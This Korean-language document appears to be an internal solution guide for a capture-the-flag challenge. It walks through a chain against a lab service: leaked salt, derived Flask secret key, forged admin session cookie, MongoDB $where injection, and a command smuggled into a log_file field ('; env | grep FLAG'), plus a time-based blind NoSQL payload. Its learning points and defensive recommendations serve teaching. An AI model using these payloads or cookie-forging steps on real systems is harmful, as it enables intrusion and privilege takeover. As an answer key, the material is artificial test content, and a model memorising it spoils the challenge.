# Legacy Microservice 공격 - 내부 풀이 가이드

## 문제 개요

이 문제는 다음을 포함하는 현실적인 공격 체인을 보여줍니다:
1. 정보 노출 (Information disclosure)
2. Secret 유도 (Secret derivation)
3. 세션 위조 (Session forgery)
4. NoSQL injection
5. Command injection

## 상세 솔루션

### Stage 1: 서비스 탐색

API 탐색으로 시작:
```bash
curl http://target:5000/api/v2/services
```

auth, api, legacy(deprecated) 세 가지 서비스가 드러납니다.

Legacy 서비스 열거:
```bash
curl http://target:5000/api/v2/services/legacy/endpoints
```

### Stage 2-3: Secret 발견

레거시 엔드포인트가 민감한 정보를 노출합니다:

1. Salt 획득:
```bash
curl http://target:5000/api/legacy/get_salt
# 반환: {"salt": "CompanyName2025"}
```

2. 시스템 정보 획득:
```bash
curl http://target:5000/api/legacy/system_info
# 드러남: Flask, SecureCookie, sha256, 32-char keys
```

### Stage 4: Secret 유도

Flask의 기본 secret key 유도 방식을 복제할 수 있습니다:
```python
import hashlib
salt = "CompanyName2025"
secret_key = hashlib.sha256(salt.encode()).hexdigest()[:32]
# 결과: 7c4a8d09ca3762af61e59520943dc264
```

### Stage 5: 세션 위조

itsdangerous (Flask의 세션 라이브러리) 사용:
```python
from itsdangerous.url_safe import URLSafeTimedSerializer
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)
admin_session = {'role': 'admin', 'user': 'admin'}
admin_cookie = serializer.dumps(admin_session)
```

### Stage 6: 체인 공격

`/api/admin/db/migrate` 엔드포인트에는 두 가지 취약점이 있습니다:

1. **NoSQL Injection**: `filter` 파라미터가 MongoDB에 직접 전달됨:
```json
{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/tmp/test"
}
```

2. **Command Injection**: NoSQL injection 성공 시, `log_file` 파라미터가 취약함:
```json
{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/tmp/x; env | grep FLAG"
}
```

## 주요 학습 포인트

1. **레거시 시스템**: 종종 잊혀진 취약점을 포함합니다
2. **정보 노출**: 치명적인 보안 침해로 이어질 수 있습니다
3. **세션 보안**: Secret key의 기밀성에 의존합니다
4. **NoSQL Injection**: SQL과 다르지만 동등하게 위험합니다
5. **취약점 체인**: 여러 문제가 결합되어 영향을 증폭시킵니다

## 방어 권장사항

1. 레거시 엔드포인트를 제거하거나 적절히 보호하세요
2. 암호화 재료를 절대 노출하지 마세요
3. 환경별 비밀을 사용하세요
4. 모든 데이터베이스 쿼리를 검증하세요
5. 파일 경로를 검증하고 검증하세요
6. 적절한 접근 제어를 구현하세요
7. 정기적인 보안 감사를 수행하세요

## 난이도 노트

- **일반 모드** (BLIND_RCE=false): 명령어 출력이 반환됨
- **어려운 모드** (BLIND_RCE=true): Blind exploitation 기법 필요

## 시간 기반 Blind NoSQL Injection (보너스)

고급 플레이어의 경우, 시간 기반 추출이 가능합니다:
```javascript
{"$where": "function() {
    if (this.role == 'admin') {
        var start = Date.now();
        while(Date.now() - start < 5000) {}
    }
    return false;
}"}
```

Admin 사용자가 존재하면 5초 지연이 발생합니다.

---

*이 풀이 가이드는 내부 사용 전용입니다. 참가자에게 배포하지 마세요.*
